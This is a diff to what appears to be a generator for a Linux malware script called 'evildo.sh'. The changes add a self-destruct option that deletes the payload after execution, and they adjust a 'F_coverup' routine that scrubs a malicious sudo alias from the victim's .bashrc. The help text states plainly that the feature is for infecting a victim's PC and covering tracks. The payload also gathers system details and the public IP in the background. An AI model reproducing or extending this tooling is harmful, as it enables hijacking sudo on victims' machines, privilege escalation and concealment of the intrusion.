@@ -13,7 +13,7 @@ Uname: \$(uname -a)
 Public IP: \$( curl -s https://ipinfo.io/ip & 2> /dev/null )
 " &> /dev/null &
 
-if [ -f "\$(realpath "\$0")" ]; then
+if [[ -f "\$(realpath "\$0")" && "$SELFDEL" == "y" ]]; then
 rm -f "\$(realpath "\$0")" &> /dev/null & disown
 fi
 
@@ -28,8 +28,8 @@ echo '
 
 ##FUNCS
 function F_coverup {
-for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | cut -c 1-1); do
-OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
+for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | cut -c 1-1); do
+OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
 sed -i "\${OUT_CLEAN}d" \$HOME/.bashrc
 done
 
@@ -99,8 +99,8 @@ echo '
 
 ##FUNCS
 function F_coverup {
-for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | cut -c 1-1); do
-OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
+for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | cut -c 1-1); do
+OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
 sed -i "\${OUT_CLEAN}d" \$HOME/.bashrc
 done
 
@@ -313,6 +313,27 @@ This option allows you to display a custom message when a malicious script is ex
 ;;
 esac
 done
+
+while true; do
+echo -ne "[\e[31m Basic \e[0m] "
+read -p "Self-destruct after execution?(y/n/i) $INPUT_SYM " QN_SELFDEL
+case "$QN_SELFDEL" in
+y|Y)
+SELFDEL="y"
+break
+;;
+n|N)
+SELFDEL="n"
+break
+;;
+i|I)
+echo "
+If this option is enabled, the script will delete itself after execution. This is useful if you want to infect the victim's PC and cover your tracks. Additionally, it may be helpful if the script was first executed as a normal user and you later want it to run with root privileges (for additional functionality), without needing to re-download or regenerate it.
+"
+;;
+esac
+done
+
 echo -e "
 \e[32mGenerating evildo.sh...\e[0m"
 if [ -f "evildo.sh" ]; then
